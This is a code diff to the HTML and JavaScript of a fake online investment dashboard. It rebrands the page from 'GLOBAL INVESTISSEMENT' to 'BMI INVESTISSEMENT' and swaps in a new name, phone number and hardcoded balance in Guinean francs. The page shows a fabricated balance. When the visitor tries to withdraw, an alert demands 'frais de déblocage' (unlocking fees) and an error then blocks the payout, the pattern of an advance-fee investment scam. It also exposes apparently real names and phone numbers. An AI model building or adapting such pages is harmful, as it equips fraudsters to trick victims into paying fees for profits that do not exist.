@@ -231,7 +231,7 @@
 <body>
     <script>
         let code = prompt("Veuillez entrer votre numéro de téléphone :");
-        if (code === "0779237248") {
+        if (code === "629248018") {
             document.body.style.display = 'block';
         } else {
             alert("Numéro incorrect. Accès refusé.");
@@ -241,14 +241,14 @@
 
     <header>
         <div class="logo">
-            <h1>GLOBAL INVESTISSEMENT</h1>
+            <h1>BMI INVESTISSEMENT</h1>
         </div>
         <nav>
             <div class="actions">
-                <span class="balance">Solde: 1 050 000 F CFA</span>
+                <span class="balance">Solde: 28 800 000 GNF</span>
                 <div class="account-info">
-                    <span id="user-name">KONATE BEN ISSOUF</span><br>
-                    <span id="user-phone">+225 077 923 72 48</span>
+                    <span id="user-name"> SEKOU TOURE </span><br>
+                    <span id="user-phone"> 224 629 248 018</span>
                 </div>
                 <button id="whatsapp-button">Contact WhatsApp</button>
                 <button id="logout-button">Déconnexion</button>
@@ -310,9 +310,9 @@
             setInterval(updatePrice, 5000);
 
             const setWithdrawalInfo = (method) => {
-                const accountName = "KONATE BEN ISSOUF";
-                const accountNumber = "225 077 923 72 48";
-                const balance = "1 050 000 F CFA";
+                const accountName = "SEKOU TOURE";
+                const accountNumber = "224 629 248 018";
+                const balance = "28 800 000 GNF";
                 withdrawalInfo.innerHTML = `${accountName}<br>${accountNumber}<br>${balance}<br>via ${method}`;
                 withdrawalForm.style.display = 'flex';
             };
@@ -332,7 +332,7 @@
             });
 
             document.getElementById('confirm-withdrawal').addEventListener('click', () => {
-                alert('Cher KONATE, veuillez les frais de déblocage de 400 000 F CFA afin de recevoir vos bénéfices dans les 5 minutes.');
+                alert('Cher SEKOU, veuillez payer les frais de déblocage afin de recevoir vos bénéfices immediatement.');
                 withdrawalForm.style.display = 'none';
                 errorMessage.style.display = 'block';
                 errorMessage.textContent = 'Erreur : Frais de déblocage néccéssaire.';
